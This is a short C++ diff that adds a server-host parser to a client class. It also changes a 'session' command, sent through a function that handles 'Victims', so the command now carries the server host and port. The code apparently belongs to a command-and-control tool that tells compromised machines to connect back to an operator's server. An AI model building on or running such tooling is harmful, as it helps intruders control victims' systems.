@@ -73,6 +73,35 @@ std::string Client::getServerUrl() const noexcept {
 //-------------------------------------------------
 //
 //-------------------------------------------------
+std::string Client::getServerHost() const noexcept {
+    const auto server_url = getServerUrl();
+
+    std::string_view host = server_url;
+
+    // 1. Remove the scheme (e.g., "https://")
+    const auto scheme_end = host.find("://");
+    if (scheme_end != std::string_view::npos) {
+        host.remove_prefix(scheme_end + 3);
+    }
+
+    // 2. Remove the path and query (anything after the first '/')
+    const auto path_start = host.find('/');
+    if (path_start != std::string_view::npos) {
+        host = host.substr(0, path_start);
+    }
+
+    // 3. Remove the port (anything after the first ':')
+    const auto port_start = host.find(':');
+    if (port_start != std::string_view::npos) {
+        host = host.substr(0, port_start);
+    }
+
+    return std::string(host);
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
 std::string Client::getTimeout() const noexcept {
     return m_config.get<std::string>("timeout", "10");
 }
@@ -285,7 +314,7 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
     // send command to commands endpoint
     try{
         CommandDAO cmd;
-        cmd.command = std::format("session {}", port);
+        cmd.command = std::format("session {} {}", getServerHost(), port);
         cmd.client = client_id;
         cmd.uid = generate_uuid();
         cmd.nonce = generate_nonce();
